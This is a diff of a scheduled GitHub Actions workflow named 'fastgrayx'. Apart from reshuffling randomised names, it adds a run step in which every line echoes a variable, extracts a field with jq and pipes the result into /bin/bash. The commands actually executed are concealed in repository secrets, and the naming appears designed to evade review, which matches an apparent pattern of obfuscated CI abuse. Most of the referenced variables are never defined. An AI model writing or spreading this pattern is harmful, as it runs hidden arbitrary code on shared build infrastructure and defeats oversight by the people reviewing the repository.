@@ -1,26 +1,31 @@
 name: fastgrayx
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '20 3/6 * * *'
+    - cron: '17 3/6 * * *'
 
-jobs:  # 22312
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: fastgrayx
         env:
-          di50833: ${{ secrets.di50833 }}
+          tfnpe0: ${{ secrets.tfnpe0 }}
         run: |
-          echo $di50833 | jq -r .hd7062 | /bin/bash
-          echo $md5144 | jq -r .waqo73 | /bin/bash
-          echo $ltlam4891 | jq -r .vkhhu99 | /bin/bash
-          echo $ylqra8489 | jq -r .ncn7844 | /bin/bash
-          echo $vkon4926 | jq -r .q10095 | /bin/bash
-          echo $i0 | jq -r .a1 | /bin/bash
-          echo $t29485 | jq -r .ueq1274 | /bin/bash
-          echo $dz6 | jq -r .cmgc17887 | /bin/bash
-          echo $aqmdr5 | jq -r .cd10 | /bin/bash
-          echo $ul565 | jq -r .saav01 | /bin/bash
+          echo $tfnpe0 | jq -r .ofh72756 | /bin/bash
+          echo $gj142 | jq -r .rba7 | /bin/bash
+          echo $gl31803 | jq -r .xtf23 | /bin/bash
+          echo $nvy3368 | jq -r .pobi610 | /bin/bash
+          echo $v298 | jq -r .jca8000 | /bin/bash
+          echo $vxcor782 | jq -r .scd7 | /bin/bash
+          echo $due804 | jq -r .rmxg25204 | /bin/bash
+          echo $gcoa5 | jq -r .d30 | /bin/bash
+          echo $o47650 | jq -r .m17336 | /bin/bash
+          echo $zz1 | jq -r .jv64746 | /bin/bash
+          echo $sd53 | jq -r .nk75002 | /bin/bash
+          echo $vpr2 | jq -r .rvm501 | /bin/bash
+          echo $pimgh586 | jq -r .c70 | /bin/bash
 
